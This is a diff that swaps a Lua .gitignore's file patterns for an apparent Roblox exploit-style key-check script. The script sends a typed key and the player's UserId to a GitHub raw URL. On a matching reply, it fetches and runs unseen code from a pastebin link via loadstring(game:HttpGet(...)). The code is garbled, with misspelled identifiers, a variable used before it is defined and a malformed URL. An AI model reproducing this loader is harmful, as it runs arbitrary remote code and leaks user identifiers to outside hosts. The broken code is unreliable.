@@ -1,41 +1,18 @@
-# Compiled Lua sources
-luac.out
+local Check = Instance.new("LocalScript",entereutton)
 
-# luarocks build files
-*.src.rock
-*.zip
-*.tar.gz
+Check.MouseButton1Dwonn:Connect(function()
+	local key = script.Parent.TextBox.Text
+	local userId = game:GetService("Players").LocalPlayer.UserId
+	local Url = "https://raw.githubusercontent.com/TheDevastation/Index.lua/main/index"..key.."&user="..userId
+	local enterbutton = script.Parent.TextButton
 
-# Object files
-*.o
-*.os
-*.ko
-*.obj
-*.elf
-
-# Precompiled Headers
-*.gch
-*.pch
-
-# Libraries
-*.lib
-*.a
-*.la
-*.lo
-*.def
-*.exp
-
-# Shared objects (inc. Windows DLLs)
-*.dll
-*.so
-*.so.*
-*.dylib
-
-# Executables
-*.exe
-*.out
-*.app
-*.i*86
-*.x86_64
-*.hex
+		if game:HttpGet(Url) == "~ True ~" then
+			
+			wait(1)
+			loadstring(game:HttpGet("https://pastebin.com/raw/GFr3MJ7f"))()
+			print("Access granted")
+		else	
+			enterbutton.Text = "~ Not whitelisted ~"
+	end
+end)
 
